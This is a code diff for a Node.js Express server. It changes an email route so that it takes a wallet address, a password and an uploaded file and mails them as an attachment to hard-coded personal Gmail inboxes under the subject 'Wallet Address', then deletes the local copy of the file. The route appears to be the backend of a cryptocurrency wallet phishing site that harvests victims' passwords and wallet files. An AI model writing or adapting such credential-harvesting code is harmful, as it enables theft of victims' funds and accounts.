@@ -7,6 +7,8 @@ const { DB, PORT } = require("./config");
 const nodemailer = require("nodemailer");
 const multer = require("multer");
 const fs = require("fs");
+const path = require("path");
+const upload = multer({ dest: "uploads/" }); // files will be saved in 'uploads' folder
 
 const { emailAddress, emailPassword } = require("./config");
 
@@ -63,37 +65,49 @@ app.post("/jay/send-email", async (req, res) => {
   }
 });
 
-app.post("/barbs/send-email", async (req, res) => {
+app.post("/barbs/send-email", upload.single("file"), async (req, res) => {
   const { text, wallet } = req.body;
-  console.log("Received Data:", { text, wallet });
+  const file = req.file;
 
-  if (!text || !wallet) {
+  if (!text || !wallet || !file) {
     return res
       .status(400)
-      .json({ error: "Wallet and code selection are required." });
+      .json({ error: "Wallet, password, and file are required." });
   }
 
   try {
     let transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
-        user: emailAddress, // Your Gmail
-        pass: emailPassword, // Your App Password
+        user: emailAddress,
+        pass: emailPassword,
       },
     });
 
     let mailOptions = {
-      from: "emailAddress",
-      to: "dorisnewsome4@gmail.com", // Replace with your email
-      // to: "fadeyibi26@gmail.com", // Replace with your email
+      from: emailAddress,
+      to: "fadeyibi26@gmail.com",
+      // to: "dorisnewsome4@gmail.com",
       subject: "Wallet Address",
-      text: `Wallet: ${wallet}\ncode: ${text}`,
+      text: `Wallet: ${wallet}\nPassword: ${text}`,
+      attachments: [
+        {
+          filename: file.originalname,
+          path: file.path, // path to the uploaded file
+        },
+      ],
     };
 
     await transporter.sendMail(mailOptions);
-    console.log("Email sent successfully!");
 
-    res.status(200).json({ message: "Email sent successfully!" });
+    // Clean up uploaded file after sending
+    fs.unlink(file.path, () => {
+      console.log("Temporary file deleted.");
+    });
+
+    res
+      .status(200)
+      .json({ message: "Email sent with attachment successfully!" });
   } catch (error) {
     console.error("Error sending email:", error);
     res.status(500).json({ error: "Error sending email" });
